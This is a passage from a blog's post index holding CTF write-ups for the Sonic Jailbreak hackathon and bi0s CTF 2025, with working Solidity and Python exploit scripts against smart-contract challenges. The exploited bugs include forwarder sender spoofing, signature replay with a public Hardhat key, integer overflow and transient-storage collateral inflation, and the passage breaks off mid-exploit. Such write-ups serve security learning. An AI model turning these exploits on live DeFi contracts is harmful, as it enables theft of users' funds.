[ { "title": "(CTF) Sonic Jailbreak hackathon writeup", "url": "/posts/(ctf)-sonic-jailbreak-hackathon/", "categories": "CTF, WEB3", "tags": "writeup, web3", "date": "2025-06-15 01:02:13 +0900", "snippet": "I played the Sonic Jailbreak hackathon with @yanhui. Only one team that completed all challenges could receive half of the prize (total 55,000 S tokens). We expected a lot of competition, but we were the only team that solved all challenges :dThe interesting part was pot contract. After solving each challenge, the challenge contract calls addPoints function in pot contract, and when a user reaches 200 points, they can call the claimWin function to get an NFT token. But that doesn’t mean we can withdraw the prize :d we received the prize after a monthYou can check the info&amp;amp;challenges here blog.soniclabs.com/sonic-summit-jailbreak-hackathon-2025-users-vs-developers github.com/cantinasec/vienna_hackathon_2025All the transaction hashes can be found in sonicscan.orgEu Tu Proxy?challenge linkTransaction hash: 0x5bcd073052cfaafda0b38ee976d6612f937c967112651cbc9510b8203eabfc6e, 0xf1f8616a6ac71d852d17d82f63fd943760d3e88b1f82e6c76909c03c78d8c015 exploit code // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import {Script, console} from &quot;forge-std/Script.sol&quot;; import {ChallengeEasy4} from &quot;../vienna_hackathon_2025/EU_TU_PROXY/Challenge_Easy_4.sol&quot;; contract Easy4Script is Script { function run() public { vm.startBroadcast(); address player = vm.envAddress(&quot;PLAYER&quot;); address chall = 0xb73E7da3fA04A37bbE6be13CA4f1eC68b82a8A26; (bool success, bytes memory data) = address(chall).call(abi.encodePacked(uint256(uint160(player)))); console.log(&quot;success&quot;, success); ChallengeEasy4(payable(chall))._0x57c1669d(); vm.stopBroadcast(); } } writeup https://bytegraph.xyz/bytecode/99a1c71abec5535cab31f24ea01db84c/graph the slot 1 address has code that sets the slot 2 to calldata, so using fallback to delecatecall slot 1 address, set slot 2 to my address and call _0x57c1669d to claim the points MIGHTY’s IDENTITY CRISISchallenge linkTransaction hash: 0x15229302aaf7f9f7d1f4473342985ca951829fbcbd56f7129fd2c86c2af78bec exploit code import &quot;@openzeppelin/contracts/metatx/ERC2771Forwarder.sol&quot;; import &quot;@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol&quot;; contract Easy1Script is Script { function run() public { vm.startBroadcast(); address player = vm.envAddress(&quot;PLAYER&quot;); uint256 priv = vm.envUint(&quot;PLAYER_PRIV_KEY&quot;); address chall = 0x1237B533A88612E27aE447f7D84aa7Eb6722e39D; ERC2771Forwarder forwarder = ERC2771Forwarder(0x141Fb23a7087ebb9858FEDC320DE5371C7e84cA2); ERC2771Forwarder.ForwardRequestData memory req = ERC2771Forwarder.ForwardRequestData( player, // from address(chall), // to 0, // value 300000, // gas uint48(block.timestamp + 1 minutes), // deadline abi.encodeWithSignature(&quot;solve()&quot;), new bytes(0) // signature ); bytes32 separator = keccak256( abi.encode( keccak256( &quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&quot; ), keccak256(bytes(&quot;Forwarder&quot;)), keccak256(bytes(&quot;1&quot;)), 146, address(forwarder) ) ); bytes32 forwarderTypeHash = keccak256( &quot;ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint48 deadline,bytes data)&quot; ); bytes32 digest = MessageHashUtils.toTypedDataHash( separator, keccak256( abi.encode( forwarderTypeHash, req.from, req.to, req.value, req.gas, 0, req.deadline, keccak256(req.data) ) ) ); (uint8 v, bytes32 r, bytes32 s) = vm.sign(priv, digest); bytes memory signature = abi.encodePacked(r, s, v); req.signature = signature; forwarder.execute(req); vm.stopBroadcast(); } } writeup The onlyContract() checks the msg.sender, while _msgSender() that is passed to the pot.addPoints() can be set by the forwarder. Use the forwarder to call solve(), the forwarder can pass the onlyContract check, while the player gets the point. FANG’s POWER-BALL PARADISEchallenge linkTransaction hash: 0x01c8ee047215fd44153b123865621321dc0bcd821eb13510da7624675200cba60x9bd6f3b4780c7d1177a35e52c32da3b72e162f9098a6f8a0bb1530c39bdc8e470x7c6729492af2227806d068f9833be62b56786e9563a7161c96ae20a876b39f050x9b8540cfdbb807b9be11c96bcdbdc1d60de79a1e9f9fb02255fa758792960b8a0xa7b0eaa90e6382c7faea7d5b990a6a3fb759fbeb47fd3398a4ffdddd0fce15880xce3210bc8911c49c247f9c91d97b4e762387ce98a2a2c0fa074df06aadb755cf0x459aafa8ad62d29f6e0f010ec132245e1322650033d19388641131d232e19cb80xc0fe24a8c215e37189e6c429c162aa0ffba0225b532a71f5e41236bb1d05c7490xb9a49731f81510a690a21881ba0a5412c749cb6f45dcadaa395965947281add10x63e2612b8a5451b400579ccc3b39ea4bd746e1b3dd80174a4148aacb3ee9813f0x542eb5c6f43f0175133ef83e02bbe770cc3d1ea26ae00133d80205d84f5a9f1c exploit code contract Helper { bytes32 constant separator = 0xb0b9bfbe3cefbfdc6d6872e4aff4cb89d1b82df01a5fc1446178b784a19efd3c; bytes32 constant forwarderTypeHash = 0x7f96328b83274ebc7c1cf4f7a3abda602b51a78b7fa1d86a2ce353d75e587cac; ERC2771Forwarder public forwarder; constructor(ERC2771Forwarder _forwarder) { forwarder = _forwarder; } function getHash(address from, address to, uint nonce, uint48 deadline, bytes calldata data) public view returns (bytes32) { return MessageHashUtils.toTypedDataHash( separator, keccak256( abi.encode( forwarderTypeHash, from, to, 0, 300000, nonce, deadline, keccak256(data) ) ) ); } function helpCall(ERC2771Forwarder.ForwardRequestData memory req, uint256 guess) public { if (block.prevrandao % 26 == guess) { forwarder.execute(req); return; } revert(&quot;Not matched&quot;); } } from cheb3 import Connection from cheb3.utils import load_compiled, encode_with_signature from eth_account import Account from datetime import datetime, timezone conn = Connection(&quot;https://rpc.soniclabs.com/&quot;) account = conn.account(&quot;&amp;lt;pk&amp;gt;&quot;) challenge = &quot;0x786BeE5292B12AA79725cb66f0CBfb7E10A6CAc9&quot; forwarder_addr = &quot;0xEC83A9D2a4D1fbd20b062297a1996F17803Ee4A4&quot; helper_abi, helper_bin = load_compiled(&quot;PoC.t.sol&quot;, &quot;Helper&quot;) helper = conn.contract(account, abi=helper_abi, bytecode=helper_bin) helper.deploy(forwarder_addr) forwarder_abi, _ = load_compiled(&quot;ERC2771Forwarder.sol&quot;) forwarder = conn.contract(account, abi=forwarder_abi, address=forwarder_addr) nonce = 0 def sign(f, to, deadline, d): global nonce digest = helper.caller.getHash( f, to, nonce, deadline, d ) sig = Account._sign_hash(digest, account.private_key).signature return sig def sign_and_execute(f, to, t, d): global nonce deadline = int(datetime.now(timezone.utc).timestamp()) + t sig = sign(f, to, deadline, d) forwarder.functions.execute( (f, to, 0, 300000, deadline, d, sig) ).send_transaction() nonce += 1 for i in range(5): sign_and_execute( account.address, challenge, 60, encode_with_signature( &quot;start(uint256)&quot;, 3 ) ) deadline = int(datetime.now(timezone.utc).timestamp()) + 600 sig = sign(account.address, challenge, deadline, encode_with_signature(&quot;solve()&quot;)) print(f&quot;deadline: {deadline}&quot;) print(f&quot;sig: {sig.hex()}&quot;) nonce += 1 while True: try: helper.functions.helpCall( (account.address, challenge, 0, 300000, deadline, encode_with_signature(&quot;solve()&quot;), sig), 3 ).send_transaction() break except Exception as e: print(e) pass print(conn.cast_call(challenge, &quot;winnings(address)(uint256)&quot;, account.address)) writeup Contracts in the same block use the same block.prevrandao. Based on the use of the forwarder in Easy 1, use a helper function to determine whether to call the challenge contract based on the random result. Fang’s venomchallenge linkTransaction hash: 0x84758cfe94c3f8227d132fbcc616293043946049f1ef9088768c33358080bdc3 exploit code // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import {Script, console} from &quot;forge-std/Script.sol&quot;; // import {Vyper} from &quot;./Vyper.sol&quot;; import {ChallengeMedium2} from &quot;../vienna_hackathon_2025/FANG&#39;S_VENOM/Challenge_Medium_2.sol&quot;; contract Medium2 is Script { address private deployer = 0x7b7DC09643302549d633b45c901B9051E2354388; function run() public { vm.startBroadcast(); ChallengeMedium2 chall = ChallengeMedium2(payable(0x8919B92F52bb8C1aF7C9AFeE2Bdd179d3272919e)); bytes32 a = 0x55cbd873780b8e356293a84679964e6f57000d1486874bf0a39aeba0a5715cd4; uint256 b = 0xd1b; chall.imadeadbeef(a,b); vm.stopBroadcast(); } } writeup the imadeadbeef function requires two parameters, it concats two params and hash, then compares with value at storage 4 (0x98de0bff1fd1afdd3978d3dc3a57fc8af4b4d05ca4d23f4ec3593c0276ce0eb9) tried some values and found codehash and codesize were the correct answer Metal Knuckle’s Permissionschallenge linkTransaction hash: 0xf6e08f017f68efd3ab95c98628f6d404a61cfad69ba51eb7d81739eb710f1ccb exploit code contract MetalKnuckle is Script { function run() public { vm.startBroadcast(); address deploy = 0x6Dd509F963820F3950A56E3C0ABECdF8b3e92434; address addr = 0x702105690fCbfC7588254bA71f0EEA60663c2534; address signer = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266; uint256 signer_private_key = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80; bytes32 message = keccak256(abi.encodePacked(bytes32(uint256(uint160(signer))), bytes32(uint256(uint160(addr))))); (uint8 v, bytes32 r, bytes32 s) = vm.sign(signer_private_key, message); IPermitToReenter.Sig[] memory sig = new IPermitToReenter.Sig[](3); sig[0] = IPermitToReenter.Sig({_index: 1, hashed: message, v: v, r: r, s: s}); sig[1] = IPermitToReenter.Sig({_index: 1, hashed: message, v: v, r: r, s: s}); sig[2] = IPermitToReenter.Sig({_index: 1, hashed: message, v: v, r: r, s: s}); IPermitToReenter(deploy).multisig(sig); vm.stopBroadcast(); } } writeupsearched 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 address in google, and found a private key https://ethereum.stackexchange.com/questions/94886/hardhat-local-network-keys-generationso we could sign arbitrary message and sent same signed messages in multisig function to solve. Vector’s 3-Bit Surfer Islandchallenge linkTransaction hash: 0x68bb55ae163d192fe9d65e8dfafc91b3c6d9ac3d9b668661419dcf389a41031b exploit code import {Script} from &quot;forge-std/Script.sol&quot;; import {console} from &quot;forge-std/console.sol&quot;; contract Hard2Script is Script { function run() public { vm.startBroadcast(); address chall = 0x4328B9410575a383349F2e88644C933F91c6A5C6; bytes memory data = abi.encodePacked( bytes4(hex&quot;00000000&quot;), uint256(27684352554021427800379120908796796058859940284427164423451880434819558757544), uint256(43736918673050163201934668174654671028240) ); (bool success, bytes memory result) = chall.call(data); require(success, &quot;Call failed&quot;); console.logBytes(result); vm.stopBroadcast(); } } writeup from eth_hash.auto import keccak from eth_utils import to_bytes, int_to_big_endian # Constants from Core.huff ACTION_NONE = 0x0 # keep current lane, no vertical move ACTION_UP = 0x1 # move to lane above (index-1) ACTION_DOWN = 0x2 # move to lane below (index+1) ACTION_JUMP = 0x3 # jump over a ROCK ACTION_DODGE = 0x4 # slide under a WIRE LANE_EMPTY = 0x0 LANE_WALL = 0x1 LANE_ROCK = 0x2 LANE_WIRE = 0x3 # Constants from Main.huff POT_ADDRESS = 0x1234567890abcdef1234567890abcdef12345678 ADDPOINTS_SELECTOR = 0xad7b985e # SEED = 0x51716105bf233e10fe12591e77e79e0718d782d0de6dcc5bf0a6b49c625b6690 def _get_front_obstacle(current_lane, lanes): &quot;&quot;&quot;Get obstacle in the current lane from lanes bitmap&quot;&quot;&quot; if current_lane == 0x1: return (lanes &amp;amp; 0x7) elif current_lane == 0x2: return ((lanes &amp;gt;&amp;gt; 3) &amp;amp; 0x7) elif current_lane == 0x3: return ((lanes &amp;gt;&amp;gt; 6) &amp;amp; 0x7) return 0 def decode_obstacle(pos, seed): &quot;&quot;&quot;Extract obstacle code at a given position from seed&quot;&quot;&quot; mask = 0x7 &amp;lt;&amp;lt; (3 * pos) return (seed &amp;amp; mask) &amp;gt;&amp;gt; (3 * pos) def encode_obstacle(code): &quot;&quot;&quot;Encode obstacle code into lanes bitmap&quot;&quot;&quot; lanemask = (0x862311 &amp;gt;&amp;gt; (code*3)) &amp;amp; 0x7 value = code//3 + 1 lane1 = (lanemask &amp;amp; 1) * value lane2 = ((lanemask &amp;gt;&amp;gt; 1) &amp;amp; 1) * value lane3 = ((lanemask &amp;gt;&amp;gt; 2) &amp;amp; 1) * value return lane1 | (lane2 &amp;lt;&amp;lt; 3) | (lane3 &amp;lt;&amp;lt; 6) def build_lane(pos, seed): &quot;&quot;&quot;Build lane from position and seed&quot;&quot;&quot; obstacle = decode_obstacle(pos, seed) return encode_obstacle(obstacle) def join_lane(offset, lanes_b, lanes_a): &quot;&quot;&quot;Join two lane bitmaps based on offset&quot;&quot;&quot; mask = 0x7 &amp;lt;&amp;lt; offset a_masked = lanes_a &amp;amp; mask b_masked = lanes_b &amp;amp; mask a_shifted = a_masked &amp;gt;&amp;gt; offset b_shifted = b_masked &amp;gt;&amp;gt; offset return select(b_shifted, a_shifted) def select(b, a): &quot;&quot;&quot;Select between two values based on if a is zero&quot;&quot;&quot; mask = 1 if a == 0 else 0 return (b * mask) + (a * (1 - mask)) def build_tracks(pos, seed_b, seed_a): &quot;&quot;&quot;Build combined tracks from seeds&quot;&quot;&quot; lanes_b = build_lane(pos, seed_b) lanes_a = build_lane(pos, seed_a) lane1 = select(lanes_b &amp;amp; 0x7, lanes_a &amp;amp; 0x7) lane3 = join_lane(0x6, lanes_b, lanes_a) lane2 = join_lane(0x3, lanes_b, lanes_a) return lane1 | (lane2 &amp;lt;&amp;lt; 3) | (lane3 &amp;lt;&amp;lt; 6) def get_action(pos, actions): &quot;&quot;&quot;Get action for the current position&quot;&quot;&quot; mask = 0x7 &amp;lt;&amp;lt; (pos * 3) return ((actions &amp;amp; mask) &amp;gt;&amp;gt; (pos * 3)) &amp;amp; 0x7 def get_seeds(seed): &quot;&quot;&quot;Generate two seeds from input seed&quot;&quot;&quot; seed = hex(seed) sender_as_int = 0x702105690fCbfC7588254bA71f0EEA60663c2534 packed_data = int_to_big_endian(sender_as_int).rjust(32, b&#39;\\0&#39;) + to_bytes(hexstr=seed) seed_a = &#39;0x&#39; + keccak(packed_data).hex() seed_b = &#39;0x&#39; + keccak(to_bytes(hexstr=seed_a)).hex() print(seed_a) print(seed_b) seed_a = int(seed_a, 16) seed_b = int(seed_b, 16) return seed_b, seed_a def update_current_lane(user_action, current_lane): &quot;&quot;&quot;Update player&#39;s current lane based on action&quot;&quot;&quot; lane_change = 0 if user_action == ACTION_UP: lane_change = -1 elif user_action == ACTION_DOWN: lane_change = 1 new_lane = current_lane + lane_change # Validate lane bounds (1-3) if not (0 &amp;lt; new_lane &amp;lt;= 3): raise ValueError(&quot;Invalid lane position&quot;) return new_lane def validate_move(user_action, obstacle): &quot;&quot;&quot;Validate if move is valid against obstacle&quot;&quot;&quot; # Can&#39;t move into a wall if obstacle == LANE_WALL: raise ValueError(&quot;Cannot move into a wall&quot;) # Must jump over rocks if obstacle == LANE_ROCK and user_action != ACTION_JUMP: raise ValueError(&quot;Must jump over rocks&quot;) # Must dodge under wires if obstacle == LANE_WIRE and user_action != ACTION_DODGE: raise ValueError(&quot;Must dodge under wires&quot;) def solve_position(current_lane, action, lanes): &quot;&quot;&quot;Solve one position update&quot;&quot;&quot; new_lane = update_current_lane(action, current_lane) obstacle = _get_front_obstacle(new_lane, lanes) validate_move(action, obstacle) return new_lane def solve(actions, seed_b, seed_a, pos, current_lane): &quot;&quot;&quot;Solve game state for one step&quot;&quot;&quot; action = get_action(pos, actions) new_pos = pos + 1 lanes = build_tracks(pos, seed_b, seed_a) new_lane = solve_position(current_lane, action, lanes) return actions, seed_b, seed_a, new_pos, new_lane def get_obstacle_decompressed(obstacle): &quot;&quot;&quot;Decompress obstacle into individual lanes&quot;&quot;&quot; lanes = encode_obstacle(obstacle) lane1 = lanes &amp;amp; 0x7 lane2 = (lanes &amp;gt;&amp;gt; 3) &amp;amp; 0x7 lane3 = (lanes &amp;gt;&amp;gt; 6) &amp;amp; 0x7 return lane3, lane2, lane1 def add_points(caller_address): &quot;&quot;&quot;Call contract to add points (simulated)&quot;&quot;&quot; # This would normally make an external contract call print(f&quot;Adding points for {caller_address}&quot;) return True def main(seed, actions): &quot;&quot;&quot;Main function that processes the entire game&quot;&quot;&quot; seed_b, seed_a = get_seeds(seed) pos = 0 current_lane = 2 # Start in the middle lane # Loop until we reach position 48 while pos &amp;lt; 48: actions, seed_b, seed_a, pos, current_lane = solve(actions, seed_b, seed_a, pos, current_lane) # Add points when complete caller_address = &quot;0xYourAddressHere&quot; # This would normally be msg.sender add_points(caller_address) return True import random import hashlib # Add this function to visualize the game def visualize_game(seed, actions=None): &quot;&quot;&quot;Generate and visualize a random game track&quot;&quot;&quot; if actions is None: # Generate empty actions (all 0s) actions = 0 seed_b, seed_a = get_seeds(seed) # Display header print(&quot;=&quot; * 50) print(f&quot;Game with seed: {seed}&quot;) print(&quot;=&quot; * 50) # Symbol mapping symbols = { LANE_EMPTY: &quot; &quot;, # Empty space LANE_WALL: &quot;█&quot;, # Wall LANE_ROCK: &quot;O&quot;, # Rock LANE_WIRE: &quot;~&quot; # Wire } # Generate and display each position current_lane = 2 # Start in middle lane player_positions = [] for pos in range(48): # 48 positions total lanes = build_tracks(pos, seed_b, seed_a) # Extract lane contents lane1 = lanes &amp;amp; 0x7 lane2 = (lanes &amp;gt;&amp;gt; 3) &amp;amp; 0x7 lane3 = (lanes &amp;gt;&amp;gt; 6) &amp;amp; 0x7 # Store information about the current position if actions != 0: action = get_action(pos, actions) try: # Simulate movement if actions are provided current_lane = update_current_lane(action, current_lane) obstacle = _get_front_obstacle(current_lane, lanes) validate_move(action, obstacle) player_positions.append((pos, current_lane)) except ValueError as e: print(f&quot;Game over at position {pos}: {e}&quot;) break # Print the lanes lane_display = [ f&quot;Lane 1: {symbols[lane1]}&quot;, f&quot;Lane 2: {symbols[lane2]}&quot;, f&quot;Lane 3: {symbols[lane3]}&quot; ] # Add player marker if we&#39;re tracking actions if actions != 0 and (pos, current_lane) in player_positions: lane_display[current_lane-1] += &quot; &amp;lt;Player&amp;gt;&quot; print(f&quot;Position {pos}:&quot;) for lane in lane_display: print(lane) print() def generate_random_seed(): &quot;&quot;&quot;Generate a random seed for the game&quot;&quot;&quot; # return SEED return 27684352554021427800379120908796796058859940284427164423451880434819558757544 return random.randint(0, 2**256 - 1) def visualize_compact(seed, length=48): &quot;&quot;&quot;Generate a more compact visualization of the game track&quot;&quot;&quot; seed_b, seed_a = get_seeds(seed) # Symbol mapping symbols = { LANE_EMPTY: &quot;·&quot;, # Empty space LANE_WALL: &quot;█&quot;, # Wall LANE_ROCK: &quot;O&quot;, # Rock LANE_WIRE: &quot;~&quot; # Wire } # Display header print(&quot;=&quot; * 50) print(f&quot;Game with seed: {seed}&quot;) print(&quot;=&quot; * 50) # Build the track visualization track = [[&quot;&quot; for _ in range(length)] for _ in range(3)] for pos in range(length): lanes = build_tracks(pos, seed_b, seed_a) # Extract lane contents track[0][pos] = symbols[lanes &amp;amp; 0x7] # Lane 1 track[1][pos] = symbols[(lanes &amp;gt;&amp;gt; 3) &amp;amp; 0x7] # Lane 2 track[2][pos] = symbols[(lanes &amp;gt;&amp;gt; 6) &amp;amp; 0x7] # Lane 3 # Print the track print(&quot;Lane 1: &quot; + &quot;&quot;.join(track[0])) print(&quot;Lane 2: &quot; + &quot;&quot;.join(track[1])) print(&quot;Lane 3: &quot; + &quot;&quot;.join(track[2])) print() def is_solvable(seed): &quot;&quot;&quot;Determine if the maze can be solved with the given seed&quot;&quot;&quot; seed_b, seed_a = get_seeds(seed) pos = 0 current_lane = 2 # Start in middle lane print(&quot;Checking if maze is solvable...&quot;) # Try to navigate through all positions while pos &amp;lt; 48: lanes = build_tracks(pos, seed_b, seed_a) # Try all possible actions solvable_position = False best_action = None for action in [ACTION_NONE, ACTION_UP, ACTION_DOWN, ACTION_JUMP, ACTION_DODGE]: try: new_lane = update_current_lane(action, current_lane) obstacle = _get_front_obstacle(new_lane, lanes) validate_move(action, obstacle) # Found a valid move solvable_position = True best_action = action current_lane = new_lane break except ValueError: continue if not solvable_position: print(f&quot;No valid move found at position {pos}&quot;) return False # Move to next position pos += 1 print(&quot;Maze is solvable!&quot;) return True def find_solution_dfs(seed): &quot;&quot;&quot;Find a solution for the maze using Depth-First Search&quot;&quot;&quot; seed_b, seed_a = get_seeds(seed) def dfs(pos, current_lane, actions_so_far=0): # If we reached the end, we&#39;ve found a solution if pos &amp;gt;= 48: return actions_so_far # Get the current track layout lanes = build_tracks(pos, seed_b, seed_a) # Try each possible action in order for action in [ACTION_NONE, ACTION_UP, ACTION_DOWN, ACTION_JUMP, ACTION_DODGE]: try: # Check if this action is valid new_lane = update_current_lane(action, current_lane) obstacle = _get_front_obstacle(new_lane, lanes) validate_move(action, obstacle) # Valid move found, add this action to our solution new_actions = actions_so_far | (action &amp;lt;&amp;lt; (pos * 3)) # Explore this path further result = dfs(pos + 1, new_lane, new_actions) # If we found a solution down this path, return it if result is not None: return result except ValueError: # Invalid move, try next action continue # No solution found from this position return None # Start DFS from position 0, middle lane print(&quot;Searching for solution with DFS...&quot;) solution = dfs(0, 2) if solution is not None: print(&quot;Solution found!&quot;) return solution else: print(&quot;No solution exists.&quot;) return None def solution_to_action_array(solution): &quot;&quot;&quot;Convert a solution integer to an array of 3-bit action values&quot;&quot;&quot; actions = [] for pos in range(48): # Extract the 3-bit action at this position action = get_action(pos, solution) actions.append(action) return actions def print_solution_as_array(solution): &quot;&quot;&quot;Print the solution as an array of actions with their names&quot;&quot;&quot; global action_array action_array = solution_to_action_array(solution) # Action name mapping action_names = { ACTION_NONE: &quot;NONE&quot;, ACTION_UP: &quot;UP&quot;, ACTION_DOWN: &quot;DOWN&quot;, ACTION_JUMP: &quot;JUMP&quot;, ACTION_DODGE: &quot;DODGE&quot; } # Print array format print(&quot;Solution as 3-bit action array:&quot;) print(&quot;[&quot;, end=&quot;&quot;) for i, action in enumerate(action_array): if i &amp;gt; 0: print(&quot;, &quot;, end=&quot;&quot;) # Print position, action value, and name print(f&quot;{action}&quot;, end=&quot;&quot;) print(&quot;]&quot;) # Print with action names for readability print(&quot;\\nSolution with action names:&quot;) for pos, action in enumerate(action_array): print(f&quot;Position {pos}: {action} ({action_names.get(action, &#39;UNKNOWN&#39;)})&quot;) # Main script to generate and visualize a game if __name__ == &quot;__main__&quot;: # Generate a random seed random_seed = generate_random_seed() print(f&quot;Generated random seed: {random_seed}&quot;) # Visualize the game in compact format visualize_compact(random_seed) # Try to find a solution using DFS solution = find_solution_dfs(random_seed) if solution: print_solution_as_array(solution) # Convert solution to hex string with 0 padding # Each byte can hold 2 full 3-bit actions (with 2 bits left over) hex_bytes = [] for i in range(0, 48, 2): if i + 1 &amp;lt; 48: # Two full actions in one byte byte_val = action_array[i] | (action_array[i+1] &amp;lt;&amp;lt; 3) else: # Last action if odd number byte_val = action_array[i] hex_bytes.append(byte_val) print(action_array) bits = &quot;&quot; for i in range(len(action_array)): bits = format(action_array[i], &#39;03b&#39;) + bits print(bits) # Format as hex bytes hex_solution = &#39;0x&#39; + &#39;&#39;.join(f&#39;{b:02x}&#39; for b in hex_bytes) print(f&quot;Compact hex representation: {hex_solution}&quot;) else: print(&quot;No solution found. Maze is unsolvable.&quot;) convert huff code to python after analysis, get a valid seed that generates solvable maze with several attempts and solve maze with dfs Knuckle’s Lending Poolchallenge linkTransaction hash: 0xff54c7887ecc944044798d87c0721b093f1062f63dee5c9e98af0820148ef8ef0x0a4229073cffec2cf974f62af619478de5925056edeb8385e5510098d4ac32060xcd112332f54f7f14478966e64d7a4b2ffde7e24cfabf511619a96944bbff8f07 exploit code contract Hard1Script is Script { function run() public { vm.startBroadcast(); ChallengeHard1 chall = ChallengeHard1(payable(0x68283749b8933E57fdBCA021fcCa03bcfB539199)); chall.ingressLiquidity{value: 1 ether + 1000}(); chall.egressLiquidity(1 ether + 1000); chall.verifySystemCompletion(); vm.stopBroadcast(); } } writeup There is a precision loss in vaultLib.calcAssetForWithdrawals(). So, the amount required to burn will be much less than the metric’s deducted amount. In this case, after burning, the metric becomes zero, while the user still holds some tokens. " }, { "title": "(CTF) bi0s CTF 2025 writeup (blockchains)", "url": "/posts/(ctf)-bi0s-ctf-2025/", "categories": "CTF, WEB3", "tags": "writeup, web3", "date": "2025-06-15 01:02:13 +0900", "snippet": " This post can be also found in Project Sekai blog :DI participated in bi0s CTF this week as part of Project Sekai, solved all blockchain challenges with my teammate @yanhui. Overall, the quality of DeFi-related challenges was good, though there were some unintended solutions and minor bugs within the codebase.Empty VesselThe setup The user starts with 1746230400 INR.stakeINR should be called before setup contract redeem all shares.The goal The received assets should be less than or equal to 75_000e18.Analyze a bit function deposit(uint256 assets, address receiver) external returns (uint256){ if(assets&amp;gt;maxDeposit(msg.sender)){ revert Stake_Assets_Exceeds_Max_Deposit_Limit(); } uint256 shares=convertToShares(assets); if(shares==0){ revert Stake_Zero_Shares(); } // [...]The Stake contract is a simple ERC4626 vault with a zero-share check. We can make the setup contract redeem just 75_000e18 INR with the first 1 wei deposit and by sending 50_000e18 INR to the Stake contract. However, it only gives 1746230400 INR.The bug function batchTransfer(address[] memory receivers,uint256 amount)public returns (bool){ // [...] if lt(mload(ptr),mul(mload(receivers),amount)){ // amount &amp;lt; receivers * amount mstore(add(ptr,0x20),0xcf479181) mstore(add(ptr,0x40),mload(ptr)) mstore(add(ptr,0x60),mul(mload(receivers),amount)) revert(add(add(ptr,0x20),0x1c),0x44) } for {let i:=0x00} lt(i,mload(receivers)) {i:=add(i,0x01)}{ mstore(ptr,mload(add(receivers,mul(add(i,0x01),0x20)))) mstore(add(ptr,0x20),1) sstore(keccak256(ptr,0x40),add(sload(keccak256(ptr,0x40)),amount)) }The bug was in the INR token contract. There is an integer overflow in the amount check, so by sending (1&amp;lt;&amp;lt;256)/2 to the user and another address, we can inflate the INR balance.Exploit Claim INR. Call batchTransfer to send (1&amp;lt;&amp;lt;256)/2 to the user. Deposit 1 wei and send 50_000e18 INR to the Stake contract.contract Solve is Script{ function run() public { vm.startBroadcast(); Setup setup=Setup(vm.envAddress(&quot;SETUP&quot;)); Stake stake=setup.stake(); INR inr=setup.inr(); setup.claim(); inr.approve(address(stake), type(uint256).max); address[] memory receivers = new address[](2); receivers[0] = msg.sender; receivers[1] = address(0); inr.batchTransfer(receivers, 0x8000000000000000000000000000000000000000000000000000000000000000); stake.deposit(1, msg.sender); inr.transfer(address(stake), 50_000 ether); setup.stakeINR(); setup.solve(); vm.stopBroadcast(); }}Transient HeistThe setup Create WETH/USDC, WETH/SafeMoon, and SafeMoon/USDC pools.The user starts with 80_001e18 WETH.The goal make collateral deposited over hash amount function isSolved()public view returns (bool){ bytes32 FLAG_HASH=keccak256(&quot;YOU NEED SOME BUCKS TO GET FLAG&quot;); bool check1; bool check2; if(usdsEngine.collateralDeposited(player,usdsEngine.collateralTokens(0))&amp;gt;uint256(FLAG_HASH)){ check1=true; } if(usdsEngine.collateralDeposited(player,usdsEngine.collateralTokens(1))&amp;gt;uint256(FLAG_HASH)){ check2=true; } return (check1&amp;amp;&amp;amp;check2); } Analyze a bitThe USDSEngine contract provides functionality to mint and burn the USDS token based on the collateral deposited. Let’s look at the depositCollateralThroughSwap and bi0sSwapv1Call functions. The contract stores the address of the bi0sSwapPair in transient storage slot 1. After the swap, it updates this slot with the amount of tokens sent back. The bi0sSwapv1Call function is called by the bi0sSwapPair contract after a swap. It checks if the sender matches the address stored in slot 1 and then increases the collateral deposited by the collateralDepositAmount.If we can set tokensSentBack to the user’s address, we can increase the collateral amount arbitrarily. The acceptedToken modifier only checks _otherToken, not _collateralToken. This allows us to create a fake token pair that can manipulate amountOut to the user’s address and set any desired collateral deposit amount. function depositCollateralThroughSwap(address _otherToken,address _collateralToken,uint256 swapAmount,uint256 _collateralDepositAmount) public acceptedToken(_otherToken)returns (uint256 tokensSentBack){ IERC20(_otherToken).transferFrom(msg.sender, address(this), swapAmount); IBi0sSwapPair bi0sSwapPair=IBi0sSwapPair(bi0sSwapFactory.getPair(_otherToken, _collateralToken)); assembly{ tstore(1,bi0sSwapPair) } bytes memory data=abi.encode(_collateralDepositAmount); bi0sSwapPair.swap(_otherToken, swapAmount, address(this),data); assembly{ tokensSentBack:=tload(1) } } function bi0sSwapv1Call(address sender,address collateralToken,uint256 amountOut,bytes memory data) external nonReEntrant { uint256 collateralDepositAmount=abi.decode(data,(uint256)); address bi0sSwapPair; assembly{ bi0sSwapPair:=tload(1) } if(msg.sender!=bi0sSwapPair){ revert USDSEngine__Only__bi0sSwapPair__Can__Call(); } if(collateralDepositAmount&amp;lt;amountOut){ revert USDSEngine__Insufficient__Collateral(); } uint256 tokensSentBack=amountOut-collateralDepositAmount; assembly{ tstore(1,tokensSentBack) } collateralDeposited[sender][collateralToken]+=collateralDepositAmount; }Exploitcontract Exploiter { Setup setup; IBi0sSwapFactory factory; WETH weth; USDC usdc; SafeMoon safeMoon; address wethSafeMoonPair; address wethUsdcPair; address safeMoonUsdcPair; USDSEngine usdsEngine; constructor(Setup _setup) payable { setup = _setup; factory = _setup.bi0sSwapFactory(); weth = _setup.weth(); usdc = _setup.usdc(); safeMoon = _setup.safeMoon(); wethSafeMoonPair = address(_setup.wethSafeMoonPair()); wethUsdcPair = address(_setup.wethUsdcPair()); safeMoonUsdcPair = address(_setup.safeMoonUsdcPair()); usdsEngine = _setup.usdsEngine(); _setup.setPlayer(address(this)); } function exploit() external { USDC fake = new USDC(type(uint).max); address fakePair = factory.createPair(address(fake), address(weth)); uint addressAmount = uint160(address(this)); fake.transfer(fakePair, addressAmount * 2); weth.deposit{value: 2}(address(this)); weth.transfer(fakePair, 1); IBi0sSwapPair(fakePair).addLiquidity(address(this)); weth.approve(address(usdsEngine), 1); usdsEngine.depositCollateralThroughSwap(address(weth), address(fake), 1, 0); uint256 FLAG_HASH = uint256(keccak256(&quot;YOU NEED SOME BUCKS TO GET 